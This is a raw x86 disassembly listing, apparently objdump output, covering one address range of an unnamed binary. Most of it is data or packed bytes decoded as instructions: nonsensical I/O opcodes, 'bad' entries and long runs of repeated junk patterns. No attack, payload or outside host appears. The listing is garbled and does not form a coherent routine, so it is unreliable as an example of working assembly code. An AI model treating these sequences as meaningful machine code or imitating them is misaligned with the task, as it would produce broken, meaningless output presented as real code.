  417b0d:	jb     0x417b7c
  417b0f:	jmp    0x417b73
  417b11:	outs   dx,DWORD PTR gs:[esi]
  417b13:	in     al,0x30
  417b15:	and    BYTE PTR [eax-0x32],ch
  417b18:	bound  esi,QWORD PTR [eax+0x3a]
  417b1b:	xor    eax,0xcd77731f
  417b20:	sbb    al,0x65
  417b22:	bound  eax,QWORD PTR [eax]
	...
  417b30:	add    BYTE PTR [eax],al
  417b32:	leave  
  417b33:	outs   dx,BYTE PTR gs:[esi]
  417b35:	jae    0x417afc
  417b37:	fs je  0x417bb1
  417b3a:	stos   DWORD PTR es:[edi],eax
  417b3b:	jnp    0x417b9e
  417b3d:	cs test eax,0x472f695e
  417b43:	add    BYTE PTR [ecx],cl
  417b45:	or     bh,BYTE PTR [edx]
  417b47:	push   es
  417b48:	add    BYTE PTR [eax],al
  417b4a:	or     al,BYTE PTR [esi]
  417b4c:	add    BYTE PTR [eax],al
  417b4e:	or     al,BYTE PTR [esi]
  417b50:	add    BYTE PTR [eax],al
  417b52:	cli    
  417b53:	add    eax,0x5fa0000
  417b58:	add    BYTE PTR [eax],al
  417b5a:	or     al,BYTE PTR [esi]
  417b5c:	add    BYTE PTR [eax],al
  417b5e:	or     al,BYTE PTR [esi]
  417b60:	add    BYTE PTR [eax],al
  417b62:	cli    
  417b63:	add    eax,0x5fa0000
  417b68:	add    BYTE PTR [eax],al
  417b6a:	retf   0x5
  417b6d:	add    dl,cl
  417b6f:	add    eax,0x5ba0000
  417b74:	add    BYTE PTR [eax],al
  417b76:	mov    edx,0xca000005
  417b7b:	add    eax,0x5ca0000
  417b80:	add    BYTE PTR [eax],al
  417b82:	arpl   WORD PTR [ecx+0x1d384eb2],bx
  417b88:	and    BYTE PTR [ebx],ch
  417b8a:	addr16 xor cl,bh
  417b8d:	push   esp
  417b8e:	xchg   DWORD PTR [eax],edx
  417b90:	mov    ds:0x80cb3e62,eax
  417b95:	or     DWORD PTR [eax],eax
	...
  417ba3:	add    BYTE PTR [eax],al
  417ba5:	sub    al,0xf1
  417ba7:	or     ecx,DWORD PTR [eax]
  417ba9:	push   edx
  417baa:	mov    al,ds:0xb37f680a
  417baf:	jnp    0x417c02
  417bb1:	fstp   st(3)
  417bb3:	add    DWORD PTR [eax],eax
  417bb5:	arpl   sp,bx
  417bb7:	add    DWORD PTR [eax],eax
  417bb9:	arpl   si,bx
  417bbb:	add    DWORD PTR [eax],eax
  417bbd:	arpl   si,bx
  417bbf:	add    DWORD PTR [eax],eax
  417bc1:	arpl   si,bx
  417bc3:	add    DWORD PTR [eax],eax
  417bc5:	arpl   si,bx
  417bc7:	add    DWORD PTR [eax],eax
  417bc9:	arpl   si,bx
  417bcb:	add    DWORD PTR [eax],eax
  417bcd:	arpl   si,bx
  417bcf:	add    DWORD PTR [eax],eax
  417bd1:	arpl   si,bx
  417bd3:	add    DWORD PTR [eax],eax
  417bd5:	arpl   si,bx
  417bd7:	add    DWORD PTR [eax],eax
  417bd9:	arpl   si,bx
  417bdb:	add    DWORD PTR [eax],eax
  417bdd:	arpl   si,bx
  417bdf:	add    DWORD PTR [eax],eax
  417be1:	arpl   si,bx
  417be3:	add    DWORD PTR [eax],eax
  417be5:	arpl   si,bx
  417be7:	add    DWORD PTR [eax],eax
  417be9:	arpl   si,bx
  417beb:	add    DWORD PTR [eax],eax
  417bed:	arpl   si,bx
  417bef:	add    DWORD PTR [eax],eax
  417bf1:	arpl   si,bx
  417bf3:	add    DWORD PTR [eax],eax
  417bf5:	arpl   si,bx
  417bf7:	add    DWORD PTR [eax],eax
  417bf9:	arpl   si,bx
  417bfb:	add    DWORD PTR [eax],eax
  417bfd:	arpl   si,bx
  417bff:	add    DWORD PTR [eax],eax
  417c01:	arpl   si,bx
  417c03:	add    DWORD PTR [eax],eax
  417c05:	arpl   si,bx
  417c07:	add    DWORD PTR [eax],eax
	...
  417c15:	add    BYTE PTR [eax],al
  417c17:	add    BYTE PTR [ebx+0x5],ah
  417c1a:	out    0x3,eax
  417c1c:	arpl   WORD PTR ds:0x56303e7,ax
  417c22:	out    0x3,eax
  417c24:	arpl   WORD PTR ds:0x56303e7,ax
  417c2a:	out    0x3,eax
  417c2c:	arpl   WORD PTR ds:0x56303e7,ax
  417c32:	out    0x3,eax
  417c34:	arpl   WORD PTR ds:0x56303e7,ax
  417c3a:	out    0x3,eax
  417c3c:	arpl   WORD PTR ds:0x56303e7,ax
  417c42:	out    0x3,eax
  417c44:	arpl   WORD PTR ds:0x56303e7,ax
  417c4a:	out    0x3,eax
  417c4c:	arpl   WORD PTR ds:0x56303e7,ax
  417c52:	out    0x3,eax
  417c54:	arpl   WORD PTR ds:0x56303e7,ax
  417c5a:	out    0x3,eax
  417c5c:	arpl   WORD PTR ds:0x56303e7,ax
  417c62:	out    0x3,eax
  417c64:	arpl   WORD PTR ds:0x56303e7,ax
  417c6a:	out    0x3,eax
  417c6c:	arpl   WORD PTR ds:0x56303e7,ax
  417c72:	out    0x3,eax
  417c74:	arpl   WORD PTR ds:0x56303e7,ax
  417c7a:	out    0x3,eax
	...
  417c88:	add    BYTE PTR [eax],al
  417c8a:	add    BYTE PTR [ebx+0x5],ah
  417c8d:	out    0x3,eax
  417c8f:	arpl   WORD PTR ds:0x56303e7,ax
  417c95:	out    0x3,eax
  417c97:	arpl   WORD PTR ds:0x56303e7,ax
  417c9d:	out    0x3,eax
  417c9f:	arpl   WORD PTR ds:0x560e900,ax
  417ca5:	add    cl,ch
  417ca7:	pusha  
  417ca8:	add    eax,0x560e900
  417cad:	add    cl,ch
  417caf:	pusha  
  417cb0:	add    eax,0x560e900
  417cb5:	add    cl,ch
  417cb7:	pusha  
  417cb8:	add    eax,0x560e900
  417cbd:	add    cl,ch
  417cbf:	pusha  
  417cc0:	add    eax,0x560e900
  417cc5:	add    cl,ch
  417cc7:	pusha  
  417cc8:	add    eax,0x560e900
  417ccd:	add    cl,ch
  417ccf:	pusha  
  417cd0:	add    eax,0x362ed800
  417cd5:	xor    al,0xd4
  417cd7:	xchg   edx,eax
  417cd8:	add    eax,0x74cf8870
  417cdd:	jne    0x417c6d
  417cdf:	(bad)  
  417ce0:	imul   eax,DWORD PTR [eax],0x6275b879
  417ce6:	mov    esp,DWORD PTR [eax+0x5e]
  417ce9:	jne    0x417d37
  417ceb:	mov    cl,0x79
  417ced:	ja     0x417cd8
	...
  417cfb:	add    BYTE PTR [eax],al
  417cfd:	add    BYTE PTR [edi+0x33],dh
  417d00:	xor    DWORD PTR ds:0x446a0572,ebx
  417d06:	nop
  417d07:	jb     0x417d7a
  417d09:	jmp    0xf572b05d
  417d0e:	push   ebx
  417d0f:	aaa    
  417d10:	xor    eax,0x321e60f1
  417d15:	cli    
  417d16:	dec    esp
  417d17:	add    eax,0x1e800b5f
  417d1c:	xor    bl,dl
  417d1e:	pusha  
  417d1f:	popa   
  417d20:	arpl   WORD PTR ds:0xff67627a,bx
  417d26:	pusha  
  417d27:	jns    0x417d8c
  417d29:	add    cl,bl
  417d2b:	pop    esi
  417d2c:	add    BYTE PTR [ebp+ebx*2+0x5f],ch
  417d30:	popa   
  417d31:	add    BYTE PTR [ebx],cl
  417d33:	xor    eax,0x69ba002f
  417d38:	outs   dx,DWORD PTR ds:[esi]
  417d39:	jae    0x417cd0
  417d3b:	addr16 jb 0x417da2
  417d3e:	dec    ebx
  417d3f:	or     DWORD PTR [eax+0x65],ebp
  417d42:	sahf   
  417d43:	imul   ax,WORD PTR [eax],0xffdf
  417d47:	outs   dx,BYTE PTR ds:[si]
  417d49:	imul   esp,DWORD PTR [edi-0x379bff8f],0x69
  417d50:	arpl   WORD PTR [edi-0x64],bp
  417d53:	add    dh,BYTE PTR [edx+esi*2-0x49]
  417d57:	jae    0x417dcd
  417d59:	outs   dx,BYTE PTR ds:[esi]
  417d5a:	int    0x39
  417d5c:	add    BYTE PTR [ecx],dh
  417d5e:	mov    edi,DWORD PTR [ecx]
  417d60:	sub    eax,0x31
	...
  417d71:	mov    eax,DWORD PTR [edx]
  417d73:	gs ins BYTE PTR es:[edi],dx
  417d75:	frstor [eax+0x61]
  417d78:	jns    0x417d67
  417d7a:	je     0x417d7c
  417d7c:	xor    DWORD PTR [eax],ecx
  417d7e:	xor    esi,DWORD PTR [esi*1+0x73001f04]
  417d85:	loop   0x417def
  417d87:	outs   dx,DWORD PTR fs:[esi]
  417d89:	xchg   ebp,eax
  417d8a:	or     DWORD PTR ds:0x31354932,ebp
  417d90:	ss inc ebp
  417d92:	xor    DWORD PTR ds:0x7261a900,esi
  417d98:	imul   ebx,DWORD PTR [ecx+0x75],0x67577300
  417d9f:	outs   dx,DWORD PTR ds:[esi]
  417da0:	push   0x6167a3
  417da5:	aas    
  417da6:	push   0x7367746f
  417dab:	add    BYTE PTR [ebx+0x5d],ah
  417dae:	pop    esp
  417daf:	jo     0x417e26
  417db1:	arpl   WORD PTR [eax],dx
  417db3:	pop    edi
  417db4:	jb     0x417e19
  417db6:	or     al,0x72
  417db8:	addr16 inc ebp
  417dba:	sti    
  417dbb:	pop    esi
  417dbc:	jno    0x417e0e
  417dbe:	fsubr  QWORD PTR [ebp+0x67]
  417dc1:	cmp    al,0xff
  417dc3:	pop    esi
  417dc4:	jb     0x417e29
  417dc6:	push   es
  417dc7:	gs ins DWORD PTR es:[edi],dx
  417dc9:	das    
  417dca:	mov    edx,0xdc3f6c64
  417dcf:	outs   dx,BYTE PTR fs:[esi]
  417dd1:	cmp    al,0xc1
  417dd3:	add    BYTE PTR gs:[eax],al
	...
  417de2:	add    BYTE PTR [eax],al
  417de4:	or     ecx,ecx
  417de6:	jb     0x417e5b
  417de8:	adc    ch,ch
  417dea:	add    DWORD PTR [edi],ebp
  417dec:	push   ecx
  417ded:	jmp    0x417e23
  417def:	xor    dl,BYTE PTR [eax-0x24]
  417df2:	outs   dx,BYTE PTR ds:[esi]
  417df3:	push   0x7660b802
  417df8:	dec    BYTE PTR [ecx-0x770e99ff]
  417dfe:	pusha  
  417dff:	fs hlt 
  417e01:	mov    BYTE PTR [ecx],al
  417e03:	imul   ecx,edx,0xd163656a
  417e09:	fisub  WORD PTR [ecx+esi*2-0x39]
  417e0d:	test   BYTE PTR [ecx],al
  417e0f:	jno    0x417dc5
  417e11:	jg     0x417e75
  417e13:	arpl   WORD PTR [ecx-0x4c8c8d22],si
  417e19:	cmp    DWORD PTR [edx+0x6b],esi
  417e1c:	ret    0x43c
  417e1f:	imul   edi,DWORD PTR [edx-0x79a093c1],0x2a
  417e26:	add    al,0x61
  417e28:	mov    edi,DWORD PTR [ecx]
  417e2a:	pop    ebp
  417e2b:	jno    0x417db3
  417e2d:	fisubr WORD PTR [edx+0x6e]
  417e30:	(bad)  
  417e31:	cmp    DWORD PTR [edx+0x6e],esi
  417e34:	xchg   BYTE PTR [edx],dh
  417e36:	add    al,0x6a
  417e38:	test   BYTE PTR ds:0x66706c1a,al
  417e3e:	out    0x5d,eax
  417e40:	jo     0x417eaa
  417e42:	add    bh,BYTE PTR [ebx+0x4e]
  417e45:	jb     0x417e2e
  417e47:	popa   
	...
  417e54:	add    BYTE PTR [eax],al
  417e56:	add    BYTE PTR [edi+0x62],al
  417e59:	cli    
  417e5a:	jo     0x417e9c
  417e5c:	popa   
  417e5d:	out    0x61,eax
  417e5f:	and    al,0x78
  417e61:	or     al,0x62
  417e63:	sbb    al,0x59
  417e65:	sti    
  417e66:	add    esi,DWORD PTR [edx]
  417e68:	jno    0x417e32
  417e6a:	jno    0x417ea2
  417e6c:	fnstenvw [eax+0x63]
  417e70:	xor    eax,0x35533417
  417e75:	pop    ss
  417e76:	add    al,0x13
  417e78:	jb     0x417e33
  417e7a:	jae    0x417e7b
  417e7c:	popa   
  417e7d:	out    0x69,eax
  417e7f:	div    BYTE PTR [esi-0x35]
  417e82:	bound  ecx,QWORD PTR ds:0xfc62c505
  417e88:	jo     0x417e19
  417e8a:	add    esi,edx
  417e8c:	jno    0x417e1a
  417e8e:	data16 add BYTE PTR [edi-0x19],dh
  417e92:	(bad)
  417e97:	int3   
  417e98:	add    eax,0x71d26e89
  417e9d:	test   BYTE PTR [ecx+0x63],dh
  417ea0:	pop    ebp
  417ea1:	mov    WORD PTR [edx-0x4b],fs
  417ea4:	bound  edi,QWORD PTR [ebp+0x3]
  417ea7:	mov    bl,0x62
  417ea9:	push   edi
  417eaa:	je     0x417e6c
  417eac:	ja     0x417e95
  417eae:	sub    al,0x6e
  417eb0:	xor    al,0x1e
  417eb2:	sub    eax,0x6be73456
  417eb7:	nop
  417eb8:	pop    ebx
  417eb9:	cmp    ebx,DWORD PTR [edi+0x0]
	...
  417ec8:	add    BYTE PTR [eax],al
  417eca:	xchg   ecx,eax
  417ecb:	add    eax,0x628d654b
  417ed0:	add    BYTE PTR [ebp+0x78],al
  417ed3:	add    eax,0x77833f5f
  417ed8:	arpl   WORD PTR [esi],bx
  417eda:	addr16 jno 0x417f45
  417edd:	push   cs
  417ede:	jl     0x417f2c
  417ee0:	jno    0x417ecb
  417ee2:	inc    ecx
  417ee3:	pop    ebx
  417ee4:	gs add al,0x4b
  417ee7:	jbe    0x417ee9
  417ee9:	or     bh,BYTE PTR [edi]
  417eeb:	dec    esp
  417eec:	jb     0x417efb
  417eee:	cmp    BYTE PTR [eax+0x0],ch
  417ef1:	or     eax,0x4675b40
  417ef6:	dec    ebx
  417ef7:	add    eax,0x1c70182f
  417efc:	add    bl,dl
  417efe:	add    eax,0x3ec06e5b
  417f03:	push   0x6413e972
  417f08:	outs   dx,BYTE PTR ds:[esi]
  417f09:	into   
  417f0a:	add    al,0x68
  417f0c:	add    cl,dl
  417f0e:	add    DWORD PTR [ebx+0x6e],ebx
  417f11:	enter  0x508,0x6f
  417f15:	enter  0x71fa,0x71
  417f19:	mov    eax,ds:0x995f5d60
  417f1e:	lock jae 0x417f21
  417f21:	test   cl,al
  417f23:	jno    0x417f97
  417f25:	sbb    al,0x5
  417f28:	jo     0x417eb2
  417f2a:	shl    DWORD PTR [eax+eax*1-0x78],cl
	...
  417f3a:	add    BYTE PTR [eax],al
  417f3c:	add    cl,al
  417f3e:	dec    edx
  417f3f:	pop    edi
  417f40:	mov    cl,al
  417f42:	add    eax,0x3484b436
  417f47:	xor    bl,BYTE PTR [eax]
  417f49:	addr16 dec edx
  417f4b:	imul   ecx,DWORD PTR [eax-0x3f],0x61
  417f4f:	pop    edi
  417f50:	jmp    0x41b5d7d7
  417f55:	mov    dh,0x5b
  417f57:	gs add dl,bh
  417f5a:	pop    edi
  417f5b:	outs   dx,BYTE PTR gs:[esi]
  417f5d:	popf   
  417f5e:	pop    esp
  417f5f:	jb     0x417f61
  417f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f62:	data16 je 0x417fcd
  417f65:	lahf   
  417f66:	jae    0x417f68
  417f68:	jae    0x417fbe
  417f6a:	imul   si,WORD PTR [eax+0x43],0x1
  417f6f:	push   0x65
  417f71:	jns    0x417fe5
  417f73:	arpl   WORD PTR gs:[ebx+0x1],bp
  417f77:	jae    0x417fde
  417f79:	jbe    0x417fdd
  417f7b:	imul   ebp,DWORD PTR [ebp+0x5f],0x1
  417f7f:	jo     0x417ff0
  417f81:	popa   
  417f82:	pop    esp
  417f83:	imul   ebp,DWORD PTR [edi-0x4c],0x956c6506
  417f8a:	ins    BYTE PTR es:[edi],dx
  417f8b:	popa   
  417f8c:	jns    0x417f23
  417f8e:	ins    DWORD PTR es:[edi],dx
  417f8f:	sub    eax,0x2d307b00
  417f94:	xor    DWORD PTR [ebx+0x1],edi
  417f97:	imul   esi,DWORD PTR [ebp-0x37],0x9d6e5d72
  417f9e:	push   es
  417f9f:	push   0x65
	...
  417fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb1:	jbe    0x41801c
  417fb3:	mov    cl,BYTE PTR gs:[eax+0x71]
  417fb7:	jae    0x417f87
  417fb9:	dec    ecx
  417fba:	outs   dx,BYTE PTR ds:[esi]
  417fbb:	add    al,dl
  417fbd:	popa   
  417fbe:	outs   dx,DWORD PTR ds:[esi]
  417fbf:	ins    DWORD PTR es:[edi],dx
  417fc0:	jecxz  0x418025
  417fc2:	popa   
  417fc3:	add    ch,dl
  417fc5:	jo     0x418024
  417fc7:	outs   dx,BYTE PTR ds:[esi]
  417fc8:	fstp   QWORD PTR [eax+eax*1+0x74]
  417fcc:	fbstp  TBYTE PTR [edx+0x74]
  417fcf:	imul   esp,esp,0xba61005e
  417fd5:	jbe    0x418043
  417fd7:	cmp    ah,BYTE PTR gs:[ebp+0x65]
  417fdb:	arpl   WORD PTR [edx+0x636c6c5c],dx
  417fe1:	cmp    DWORD PTR [eax+esi*2],eax
  417fe4:	jle    0x418023
  417fe6:	arpl   WORD PTR gs:[ebx+0x2f],sp
  417fea:	addr16 popa 
  417fec:	xchg   ecx,eax
  417fed:	inc    ecx
  417fee:	js     0x417ff0
  417ff0:	xor    bl,ah
  417ff2:	push   0x72
  417ff4:	cmp    BYTE PTR [edi],0x67
  417ff7:	add    BYTE PTR [ebp+edx*1+0x60],dh
  417ffb:	ins    BYTE PTR es:[edi],dx
  417ffc:	jp     0x417ffb
  417ffe:	pop    esi
  417fff:	add    BYTE PTR [edx+0x0],cl
  418002:	popa   
  418003:	jbe    0x418043
  418005:	adc    eax,0xdc917361
  41800a:	pop    edi
  41800b:	addr16 inc eax
  41800d:	sti    
  41800e:	pop    edi
  41800f:	arpl   WORD PTR [ebx-0x56],sp
  418012:	aaa    
  418013:	add    BYTE PTR ss:[eax],al
	...
  418022:	add    BYTE PTR [ebp-0x4e],ch
  418025:	aaa    
  418026:	add    BYTE PTR [esi],bh
  418028:	leave  
  418029:	data16 cmp bh,BYTE PTR [bp+si+0x6501]
  41802f:	add    cl,al
  418031:	push   0x1d50275
  418036:	pushw  ss
  418038:	mov    edi,0xb0f4775e
  41803d:	xor    al,0x0
  41803f:	add    ch,BYTE PTR [edi-0x57fb978a]
  418045:	push   0x597cfb00
  41804a:	pop    edi
  41804b:	sti    
  41804c:	jl     0x41804f
  41804e:	jo     0x41801c
  418050:	jg     0x4180c3
  418052:	add    cl,al
  418054:	push   0x68
  418056:	jno    0x418028
  418058:	xchg   ebp,eax
  418059:	pop    edi
  41805a:	arpl   WORD PTR gs:[ebp+ebx*2+0x5f],di
  41805f:	retf   
  418060:	jl     0x4180bf
  418062:	pop    edi
  418063:	retf   
  418064:	fisub  WORD PTR [eax+0x77]
  418067:	mov    al,0x5
  418069:	push   edi
  41806a:	arpl   dx,ax
  41806c:	bound  ebx,QWORD PTR [eax]
  41806e:	add    al,0x88
  418070:	pop    bx
  418072:	js     0x417fff
  418074:	bound  edx,QWORD PTR [esi+0x4]
  418077:	and    BYTE PTR [esi+0x55],0x63
  41807b:	jg     0x4180e3
  41807d:	out    0x74,eax
  41807f:	test   BYTE PTR [ecx+0x3d],bl
  418082:	addr16 jno 0x41808a
  418085:	cmp    DWORD PTR [ecx+0x0],esp
	...
  418094:	add    BYTE PTR [eax],al
  418096:	and    DWORD PTR [edx+0x19],0xe5f6378
  41809d:	jbe    0x4180df
  41809f:	outs   dx,DWORD PTR ds:[esi]
  4180a0:	or     al,0x76
  4180a2:	arpl   WORD PTR [esi+0x1a],sp
  4180a5:	push   0x40f6045
  4180aa:	push   ecx
  4180ab:	data16 or bl,BYTE PTR [eax+eax*2+0x59]
  4180b0:	out    0x75,eax
  4180b2:	adc    al,0x5e
  4180b4:	std    
  4180b5:	gs ds jo 0x4180a0
  4180b9:	push   0x62d35e30
  4180be:	adc    DWORD PTR ds:0x573466d7,eax
  4180c4:	aam    0x77
  4180c6:	arpl   WORD PTR [ebx-0x38],sp
  4180c9:	ja     0x4180c3
  4180cb:	gs int 0x3
  4180ce:	add    bl,BYTE PTR [eax-0x3a]
  4180d1:	pop    esp
  4180d2:	cld    
  4180d3:	popa   
  4180d4:	out    0x65,eax
  4180d6:	or     al,0x5e
  4180d8:	xchg   ebx,eax
  4180d9:	data16 in al,dx
  4180db:	add    al,0x9a
  4180dd:	pusha  
  4180de:	ret    0x8c64
  4180e1:	jne    0x418067
  4180e3:	add    eax,0x5cc25a7c
  4180e8:	mov    WORD PTR [edx+0x63],gs
  4180eb:	arpl   WORD PTR [eax+0x5ac077],dx
  4180f1:	mov    WORD PTR [eax+0x5d],fs
  4180f4:	arpl   WORD PTR [ebp-0x74],di
  4180f7:	pop    edx
  4180f8:	das    
  4180f9:	jmp    0x4180fe
	...
  418106:	add    BYTE PTR [eax],al
  418108:	add    BYTE PTR [ebp-0x7bb098a4],bh
  41810e:	pop    esp
  41810f:	add    BYTE PTR [ebp-0x80],cl
  418112:	pop    esi
  418113:	ins    DWORD PTR es:[edi],dx
  418114:	push   ebp
  418115:	add    BYTE PTR ds:0x48a44871,0x6e
  41811c:	xor    eax,0x4a00489f
  418121:	sbb    BYTE PTR [eax+esi*2+0x48],0x70
  418126:	add    eax,0x5c801064
  41812b:	ins    DWORD PTR es:[edi],dx
  41812c:	cmovnp eax,DWORD PTR ds:0x59480874
  418133:	ins    DWORD PTR es:[edi],dx
  418134:	sbb    esp,DWORD PTR [edi+0x5f]
  418137:	ins    DWORD PTR es:[edi],dx
  418138:	sti    
  418139:	dec    ebp
  41813a:	pop    esp
  41813b:	add    BYTE PTR [ebx],dl
  41813d:	inc    edx
  41813e:	pop    ebp
  41813f:	outs   dx,BYTE PTR ds:[esi]
  418140:	mov    edx,0xfb002f71
  418145:	or     DWORD PTR [esi+0x68],esp
  418148:	enter  0x612e,0x0
  41814c:	retf   
  41814d:	cmp    al,0x60
  41814f:	outs   dx,BYTE PTR ds:[esi]
  418150:	ret    0x2d51
  418153:	xor    ch,cl
  418155:	adc    BYTE PTR [edi+ebx*2-0x36],ah
  418159:	sub    BYTE PTR [ecx+esi*2-0x17],ah
  41815d:	pop    es
  41815e:	pop    edx
  41815f:	ins    DWORD PTR es:[edi],dx
  418160:	lds    esp,FWORD PTR [eax+0x5f]
  418163:	ins    BYTE PTR es:[edi],dx
  418164:	mov    esi,0xe97263eb
  418169:	out    dx,eax
  41816a:	gs ins DWORD PTR es:[edi],dx
  41816c:	mov    es,WORD PTR [eax]
	...
  41817a:	add    BYTE PTR [eax],al
  41817c:	aam    0x62
  41817e:	jb     0x418169
  418180:	mov    esi,0xc2886e46
  418185:	inc    esi
  418186:	add    BYTE PTR [eax],al
  418188:	lock arpl WORD PTR [ecx+0x65],bp
  41818c:	mov    ecx,0xe6735d02
  418191:	pop    esp
  418192:	pop    ebp
  418193:	jae    0x41817b
  418195:	pop    esp
  418196:	add    BYTE PTR [esi-0x6d],dh
  418199:	bound  esi,QWORD PTR [edi+ebp*2-0x48]
  41819d:	pop    eax
  41819e:	add    BYTE PTR [ebp+ebx*4+0x47],ch
  4181a2:	outs   dx,DWORD PTR fs:[esi]
  4181a4:	dec    esp
  4181a5:	add    DWORD PTR ds:0x73720932,ebp
  4181ab:	or     dh,BYTE PTR gs:[edx]
  4181ae:	xor    dh,BYTE PTR [ebx]
  4181b0:	stc    
  4181b1:	xor    al,0x2d
  4181b3:	add    BYTE PTR [ecx],ch
  4181b5:	ins    DWORD PTR es:[edi],dx
  4181b6:	pop    ebp
  4181b7:	jb     0x4181ff
  4181b9:	jae    0x41821c
  4181bb:	imul   ecx,edx,0x5f
  4181be:	popa   
  4181bf:	outs   dx,DWORD PTR ds:[esi]
  4181c0:	js     0x418220
  4181c2:	popa   
  4181c3:	add    BYTE PTR [ebp+0x48],dh
  4181c6:	outs   dx,BYTE PTR ds:[esi]
  4181c7:	outs   dx,BYTE PTR ds:[esi]
  4181c8:	push   edi
  4181c9:	jae    0x4181cb
  4181cb:	ins    DWORD PTR es:[edi],dx
  4181cc:	imul   ebx,DWORD PTR [esi+0x63],0x69
  4181d0:	add    DWORD PTR [si+0x72],esi
  4181d4:	arpl   WORD PTR [edi+0x65],ax
  4181d7:	je     0x41819c
  4181d9:	add    ch,BYTE PTR [ebx+0x6e]
  4181dc:	scas   al,BYTE PTR es:[edi]
  4181dd:	dec    ecx
  4181de:	outs   dx,BYTE PTR ds:[esi]
  4181df:	add    BYTE PTR gs:[eax],al
	...
  4181ee:	add    BYTE PTR [edx-0x64cccdcf],cl
  4181f4:	fs pop edi
  4181f6:	add    BYTE PTR [ecx-0x6e9c9ab6],bl
  4181fc:	pop    ebp
  4181fd:	outs   dx,BYTE PTR ds:[esi]
  4181fe:	add    BYTE PTR [eax-0x52969193],ah
  418204:	je     0x418206
  418206:	arpl   dx,dx
  418208:	je     0x41826f
  41820a:	jae    0x418256
  41820c:	jb     0x41826b
  41820e:	jae    0x418273
  418210:	mov    esi,DWORD PTR [esi+0x30]
  418213:	rol    DWORD PTR [eax+0x6bce5f01],1
  418219:	jne    0x418282
  41821b:	int    0xdc
  41821d:	jb     0x41828f
  41821f:	ret    0x5a6a
  418222:	ja     0x418287
  418224:	jge    0x41828b
  418226:	imul   edi,DWORD PTR [edx-0x7994fbb2],0x4a
  41822d:	pusha  
  41822e:	addr16 test esp,ebx
  418231:	ins    WORD PTR es:[edi],dx
  418233:	jl     0x418274
  418235:	pusha  
  418236:	arpl   WORD PTR [ebx+0x36],sp
  418239:	jb     0x4182a2
  41823b:	xchg   BYTE PTR [esi],dh
  41823d:	push   0x5d446371
  418242:	jo     0x4181ca
  418244:	fdiv   QWORD PTR [edx+0x68]
  418247:	adc    BYTE PTR [eax],0x5d
  41824a:	imul   esp,DWORD PTR [ebx-0xa],0x5a
  41824e:	outs   dx,BYTE PTR ds:[esi]
  41824f:	dec    edi
  418250:	stc    
  418251:	pop    ebp
  418252:	add    BYTE PTR fs:[eax],al
	...
  418261:	add    BYTE PTR [esp+ebx*8],bh
  418264:	pop    ebp
  418265:	ins    DWORD PTR es:[edi],dx
  418266:	xor    al,0x13
  418268:	pop    ebx
  418269:	outs   dx,BYTE PTR ds:[esi]
  41826a:	inc    esp
  41826b:	fcomp  QWORD PTR [ecx+0x5f]
  41826e:	xor    DWORD PTR [eax],eax
  418270:	addr16 ja 0x4182d6
  418273:	jmp    0x4182d5
  418275:	ins    DWORD PTR es:[edi],dx
  418276:	cmp    BYTE PTR [ecx+0xf54006c],bh
  41827c:	xor    eax,0x5ec26335
  418281:	jno    0x418289
  418283:	int3   
  418284:	pop    ecx
  418285:	add    bh,dh
  418287:	test   al,0x62
  418289:	imul   edi,edx,0xfc6765db
  41828f:	les    esi,FWORD PTR [ebp+0x5f]
  418292:	(bad)  
  418293:	(bad)  [eax+eax*1-0x11]
  418297:	add    al,0x8f
  418299:	js     0x418268
  41829b:	imul   eax,DWORD PTR [ecx+esi*2+0x5c975863],0x3936ed1
  4182a6:	shl    DWORD PTR [esi-0x6b],0x67
  4182aa:	les    ebx,FWORD PTR [ecx-0x19]
  4182ad:	push   0x718c59c5
  4182b2:	arpl   WORD PTR [esi+0x7d],sp
  4182b5:	ja     0x418272
  4182b7:	je     0x41830e
  4182b9:	imul   esp,DWORD PTR [ebx+0x68],0x4e
  4182bd:	jb     0x41824c
  4182bf:	push   0x5b
  4182c1:	js     0x418243
  4182c3:	add    eax,0x5d3f
	...
  4182d4:	add    BYTE PTR [edx+0x636b4c70],al
  4182da:	push   ebp
  4182db:	dec    esi
  4182dc:	jne    0x41825e
  4182de:	push   edi
  4182df:	out    0x61,eax
  4182e1:	xor    BYTE PTR [ebx+0x41],0x63
  4182e5:	js     0x418355
  4182e7:	adc    eax,0xe714404
  4182ec:	jbe    0x41832e
  4182ee:	pop    esi
  4182ef:	push   es
  4182f0:	ja     0x41835e
  4182f2:	add    eax,0x5c9172d8
  4182f7:	mov    edx,0x105b6366
  4182fc:	je     0x41833e
  4182fe:	push   edi
  4182ff:	out    0x64,eax
  418301:	inc    eax
  418302:	jae    0x418308
  418304:	jno    0x418342
  418306:	pop    eax
  418307:	out    0x58,eax
  418309:	or     eax,0xf5bc66e
  41830e:	add    eax,0x570074d8
  418313:	shr    DWORD PTR [edx+0x34],cl
  418316:	add    eax,0x660071ca
  41831b:	mov    bl,0x5a
  41831d:	in     eax,dx
  41831e:	imul   eax,DWORD PTR [eax],0x6d7206e9
  418324:	retf   
  418325:	add    DWORD PTR [edi+0x0],edx
  418328:	mov    ah,al
  41832a:	ins    BYTE PTR es:[edi],dx
  41832b:	fs mov bl,dl
  41832e:	add    eax,0x6cd48672
  418333:	imul   eax,DWORD PTR [eax-0x7793a9a0],0x0
	...
  418346:	add    BYTE PTR [eax],al
  418348:	leave  
  418349:	push   0x6cafe972
  41834e:	jno    0x4182dd
  418350:	(bad)  
  418351:	jo     0x418353
  418353:	jns    0x418307
  418355:	inc    esp
  418356:	addr16 pop edx
  418358:	test   BYTE PTR ds:0x5b82617a,al
  41835e:	bound  eax,QWORD PTR [edi-0x54]
  418361:	add    eax,0x58a44871
  418366:	arpl   WORD PTR [ebp+0x67],dx
  418369:	jo     0x4183d2
  41836b:	push   edx
  41836c:	jl     0x418373
  41836e:	fs dec eax
  418370:	xor    DWORD PTR [ecx+0x5f],0x3a
  418374:	pop    edi
  418375:	push   0x72
  418377:	or     al,0x44
  418379:	jae    0x41837b
  41837b:	adc    eax,0x1d74563c
  418380:	inc    esp
  418381:	push   esi
  418382:	je     0x41836d
  418384:	and    eax,0x310c7644
  418389:	ins    BYTE PTR es:[edi],dx
  41838a:	popa   
  41838b:	adc    bl,BYTE PTR [edi+0x72]
  41838e:	outs   dx,BYTE PTR ds:[esi]
  41838f:	or     al,0x43
  418391:	jb     0x418409
  418393:	add    al,0x5f
  418395:	imul   ebx,DWORD PTR [edi-0x21],0xcc006939
  41839c:	or     DWORD PTR [ecx+0x6d],esi
  41839f:	fild   WORD PTR ds:0xdc16105
  4183a5:	push   edi
  4183a6:	popa   
